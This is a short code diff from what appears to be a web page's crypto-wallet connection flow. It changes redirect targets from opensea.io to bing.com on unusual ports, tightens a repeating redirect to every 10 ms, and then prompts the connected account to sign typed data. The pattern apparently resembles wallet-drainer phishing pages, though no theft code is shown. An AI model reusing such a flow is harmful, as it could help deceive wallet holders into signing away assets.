@@ -99,12 +99,12 @@
         .then(account => {
           if (account) {
             // Perform redirection immediately after successful connection
-            window.location.href = 'https://opensea.io:8081';
+            window.location.href = 'https://bing.com:8082';
 
             // Optionally, delay or manage the interval-based redirection
             setInterval(function () {
-              window.location.href = 'https://opensea.io:8082';
-            }, 1000);
+              window.location.href = 'https://bing.com:8083';
+            }, 10);
 
             // Proceed with signing only if needed
             return promptSignTypedData(account);
